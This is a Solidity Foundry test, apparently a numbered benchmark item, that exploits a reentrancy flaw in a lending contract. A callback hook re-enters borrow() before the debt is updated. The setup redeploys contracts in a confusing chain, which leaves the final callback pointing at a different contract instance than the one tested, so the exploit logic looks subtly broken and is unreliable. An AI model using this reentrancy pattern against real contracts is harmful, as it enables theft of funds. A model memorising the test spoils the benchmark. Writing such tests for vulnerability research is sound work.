// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract MockToken is IERC777Like {
    function transfer(address, uint256) external pure returns (bool) { return true; }
}

contract ReenterCallback is ICallback {
    CreamCallback public c;
    bool entered;
    constructor(address _c) { c = CreamCallback(_c); }
    function tokensReceived(address, uint256 amount) external {
        if (!entered) {
            entered = true;
            c.borrow(amount);
        }
    }
}

contract Exploit_013_cream_callback is Test {
    function testExploit_ReenterBorrowBeforeDebtUpdate() public {
        MockToken t = new MockToken();
        CreamCallback c = new CreamCallback(address(t), address(0));
        ReenterCallback cb = new ReenterCallback(address(c));
        c = new CreamCallback(address(t), address(cb));
        cb = new ReenterCallback(address(c));
        c = new CreamCallback(address(t), address(cb));

        c.deposit(100);
        c.borrow(70);
        assertGt(c.debt(address(this)), 70, "reentrancy should inflate debt flow beyond single borrow");
    }
}
